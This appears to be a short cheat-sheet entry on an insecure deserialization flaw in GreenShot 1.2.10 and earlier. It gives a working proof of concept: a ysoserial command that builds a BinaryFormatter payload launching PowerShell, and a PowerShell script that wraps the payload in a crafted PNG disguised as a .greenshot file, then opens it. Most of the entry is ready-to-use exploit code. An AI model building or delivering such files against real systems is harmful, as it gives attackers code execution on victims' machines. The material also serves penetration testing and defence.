	- Living Off The Land Applications
	- GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization
	- double-click on a *.greenshot file will lead to arbitrary code execution

### Generate Payload using Ysoserial
```ps1
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity  -c "powershell.exe" --outputpath payload.bin -o raw
```

### Create a png file with some text
```
$payload = Get-Content .\payload.bin -Encoding Byte
$length = $payload.Length
Add-Type -AssemblyName System.Drawing
$bmp = new-object System.Drawing.Bitmap 250,61
$font = new-object System.Drawing.Font Consolas,24
$brushBg = [System.Drawing.Brushes]::Green
$brushFg = [System.Drawing.Brushes]::Black
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
$graphics.DrawString('PoC Command Execution',$font,$brushFg,10,10)
$graphics.Dispose()
$bmp.Save($filename)
$payload | Add-Content -Path $filename -Encoding Byte -NoNewline
[System.BitConverter]::GetBytes([long]$length) | Add-Content -Path $filename -Encoding Byte -NoNewline
"Greenshot01.02" | Add-Content -path $filename -NoNewline -Encoding Ascii
```

### Launch greenshot
```
Invoke-Item $filename
```